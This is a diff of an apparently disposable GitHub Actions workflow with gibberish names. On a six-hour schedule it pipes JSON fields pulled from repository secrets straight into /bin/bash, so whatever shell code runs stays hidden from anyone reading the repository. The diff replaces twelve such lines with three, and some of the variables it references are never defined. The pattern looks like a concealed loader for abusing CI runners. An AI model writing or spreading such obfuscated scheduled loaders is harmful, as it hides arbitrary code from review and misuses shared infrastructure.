@@ -1,11 +1,9 @@
 name: personalhissing
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '54 3/6 * * *'
-
-jobs:  # 793
+    - cron: '49 3/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -13,18 +11,9 @@ jobs:  # 793
       - uses: actions/checkout@v4
       - name: personalhissing
         env:
-          uin2854: ${{ secrets.uin2854 }}
+          nzhi0: ${{ secrets.nzhi0 }}
         run: |
-          echo $uin2854 | jq -r .wabbu9455 | /bin/bash
-          echo $rzkph1 | jq -r .gcrx1 | /bin/bash
-          echo $gzoak44630 | jq -r .b74450 | /bin/bash
-          echo $ukn8 | jq -r .mycuz729 | /bin/bash
-          echo $szf7 | jq -r .un22807 | /bin/bash
-          echo $y3436 | jq -r .yijen85 | /bin/bash
-          echo $jugj276 | jq -r .pfavb95 | /bin/bash
-          echo $w13065 | jq -r .mj5 | /bin/bash
-          echo $pzqk3 | jq -r .ivkmu7606 | /bin/bash
-          echo $o797 | jq -r .ppciq8299 | /bin/bash
-          echo $dhov60 | jq -r .lxz175 | /bin/bash
-          echo $xiymy9758 | jq -r .hswk50 | /bin/bash
+          echo $nzhi0 | jq -r .fral2 | /bin/bash
+          echo $diyff0001 | jq -r .rjkha2135 | /bin/bash
+          echo $jn218 | jq -r .jgpij3520 | /bin/bash
 
